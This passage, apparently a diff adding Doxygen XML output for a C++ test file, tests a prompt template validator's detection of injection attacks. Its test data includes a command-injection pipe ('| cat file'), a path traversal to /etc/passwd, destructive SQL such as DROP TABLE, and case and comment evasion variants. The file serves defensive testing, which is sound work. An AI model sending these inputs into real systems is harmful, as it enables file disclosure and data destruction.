+<codeline lineno="279"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::pair&lt;std::string,<sp/>const<sp/>char*&gt;&gt;<sp/>injection_tests<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="280"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;SELECT<sp/>*<sp/>FROM<sp/>data&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;SQL&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="281"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;|<sp/>cat<sp/>file&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;CMD&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="282"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;../../etc/passwd&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;PATH&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="283"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;{{{evil}}}&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;TEMPL&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="284"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="285"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="286"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>[<ref refid="bench__rewrite__engine_8cpp_1ab0f5e79a4809a73e46767641aa4e7dac" kindref="member">content</ref>,<sp/>type]<sp/>:<sp/>injection_tests)<sp/>{</highlight></codeline>
+<codeline lineno="287"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(<ref refid="bench__rewrite__engine_8cpp_1ab0f5e79a4809a73e46767641aa4e7dac" kindref="member">content</ref>);</highlight></codeline>
+<codeline lineno="288"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="289"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="290"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty())<sp/></highlight></codeline>
+<codeline lineno="291"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Failed<sp/>to<sp/>detect<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>type<sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;<sp/>injection<sp/>in:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/><ref refid="bench__rewrite__engine_8cpp_1ab0f5e79a4809a73e46767641aa4e7dac" kindref="member">content</ref>;</highlight></codeline>
+<codeline lineno="292"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="293"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="294"><highlight class="normal"></highlight></codeline>
+<codeline lineno="295"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>COVER_DirectMethodCall)<sp/>{</highlight></codeline>
+<codeline lineno="296"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Test<sp/>detectInjectionPatterns()<sp/>directly</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="297"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result1<sp/>=<sp/>validator_.detectInjectionPatterns(</highlight><highlight class="stringliteral">&quot;SELECT<sp/>*<sp/>FROM<sp/>table&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="298"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result1.warnings.empty());</highlight></codeline>
+<codeline lineno="299"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="300"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result2<sp/>=<sp/>validator_.detectInjectionPatterns(</highlight><highlight class="stringliteral">&quot;normal<sp/>content<sp/>{{var}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="301"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(result2.warnings.empty());</highlight></codeline>
+<codeline lineno="302"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="303"><highlight class="normal"></highlight></codeline>
+<codeline lineno="304"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="305"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Mutation<sp/>and<sp/>Evasion<sp/>Attempts</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="306"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="307"><highlight class="normal"></highlight></codeline>
+<codeline lineno="308"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EVADE_CaseVariations)<sp/>{</highlight></codeline>
+<codeline lineno="309"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;sElEcT<sp/>*<sp/>FrOm<sp/>users<sp/>WHERE<sp/>id={{id}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="310"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="311"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="312"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Case-insensitive<sp/>detection</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="313"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="314"><highlight class="normal"></highlight></codeline>
+<codeline lineno="315"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EVADE_CommentStripping)<sp/>{</highlight></codeline>
+<codeline lineno="316"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;SELECT<sp/>/*<sp/>comment<sp/>*/<sp/>*<sp/>FROM<sp/>users<sp/>{{id}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="317"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="318"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="319"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Detects<sp/>/*<sp/>*/<sp/>comments</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="320"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="321"><highlight class="normal"></highlight></codeline>
+<codeline lineno="322"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EVADE_MultipleKeywords)<sp/>{</highlight></codeline>
+<codeline lineno="323"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;BEGIN;<sp/>INSERT<sp/>INTO<sp/>audit<sp/>VALUES<sp/>(1);<sp/>DELETE<sp/>FROM<sp/>log;<sp/>END;&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="324"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="325"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="326"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Multiple<sp/>SQL<sp/>keywords</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="327"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="328"><highlight class="normal"></highlight></codeline>
+<codeline lineno="329"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="330"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Acceptance<sp/>Criteria<sp/>Verification</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="331"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="332"><highlight class="normal"></highlight></codeline>
+<codeline lineno="333"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>ACCEPT_TemplateValidationWorks)<sp/>{</highlight></codeline>
+<codeline lineno="334"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Acceptance:<sp/>Template<sp/>validation<sp/>rules<sp/>enforced</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="335"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>valid_tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Good<sp/>content&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="336"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(valid_tmpl);</highlight></codeline>
+<codeline lineno="337"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(result.valid<sp/>||<sp/>result.errors.empty());</highlight></codeline>
+<codeline lineno="338"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="339"><highlight class="normal"></highlight></codeline>
+<codeline lineno="340"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>ACCEPT_InjectionDetectionWorks)<sp/>{</highlight></codeline>
+<codeline lineno="341"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Acceptance:<sp/>Injection<sp/>detection<sp/>patterns<sp/>implemented</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="342"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>bad_tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;SELECT<sp/>*<sp/>FROM<sp/>users&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="343"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>bad_tmpl.dump();</highlight></codeline>
+<codeline lineno="344"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="345"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Pattern<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="346"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="347"><highlight class="normal"></highlight></codeline>
+<codeline lineno="348"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>ACCEPT_DocsAlignedToSource)<sp/>{</highlight></codeline>
+<codeline lineno="349"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Acceptance:<sp/>API<sp/>comments<sp/>updated<sp/>to<sp/>reflect<sp/>validation<sp/>guarantees</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="350"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>This<sp/>test<sp/>verifies<sp/>that<sp/>the<sp/>validator<sp/>behaves<sp/>as<sp/>documented:</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="351"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>-<sp/>detectInjectionPatterns()<sp/>returns<sp/>warnings<sp/>for<sp/>detected<sp/>patterns</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="352"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>-<sp/>validate()<sp/>integrates<sp/>injection<sp/>detection<sp/>into<sp/>the<sp/>result</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="353"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="354"><highlight class="normal"><sp/><sp/><sp/><sp/><ref refid="classthemis_1_1prompt__engineering_1_1_prompt_template_validator" kindref="compound">PromptTemplateValidator</ref><sp/>v(</highlight><highlight class="keyword">false</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="355"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>injection_result<sp/>=<sp/>v.detectInjectionPatterns(</highlight><highlight class="stringliteral">&quot;DROP<sp/>TABLE<sp/>users&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="356"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_FALSE(injection_result.warnings.empty());</highlight></codeline>
+<codeline lineno="357"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="358"><highlight class="normal"></highlight></codeline>
+<codeline lineno="359"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="360"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Focused<sp/>Test<sp/>Summary</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="361"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="362"><highlight class="normal"></highlight><highlight class="comment">//<sp/>Test<sp/>Coverage<sp/>Targets:</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="363"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>SQL<sp/>injection<sp/>detection:<sp/>5+<sp/>vectors<sp/>(UNION,<sp/>DROP,<sp/>INSERT,<sp/>quotes,<sp/>comments)</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="364"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>Command<sp/>injection<sp/>detection:<sp/>6+<sp/>vectors<sp/>(|,<sp/>;,<sp/>backticks,<sp/>$(),<sp/>&amp;&amp;,<sp/>&amp;)</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="365"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>Path<sp/>traversal<sp/>detection:<sp/>5+<sp/>vectors<sp/>(../,<sp/>..\,<sp/>/etc/,<sp/>/home/,<sp/>~)</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="366"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>Template<sp/>injection<sp/>detection:<sp/>4+<sp/>vectors<sp/>({{{}},<sp/>Jinja2<sp/>structures)</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="367"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>Edge<sp/>cases<sp/>and<sp/>mutations:<sp/>8+<sp/>variants</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="368"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>Safe<sp/>content:<sp/>4+<sp/>negative<sp/>tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="369"><highlight class="normal"></highlight><highlight class="comment">//<sp/>-<sp/>Acceptance<sp/>criteria:<sp/>3+<sp/>verification<sp/>tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="370"><highlight class="normal"></highlight><highlight class="comment">//<sp/></highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="371"><highlight class="normal"></highlight><highlight class="comment">//<sp/>Expected<sp/>coverage:<sp/>&gt;<sp/>95%<sp/>on<sp/>validator<sp/>paths<sp/>✓</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="372"><highlight class="normal"></highlight></codeline>
+    </programlisting>
+    <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp"/>
+  </compounddef>
+</doxygen>
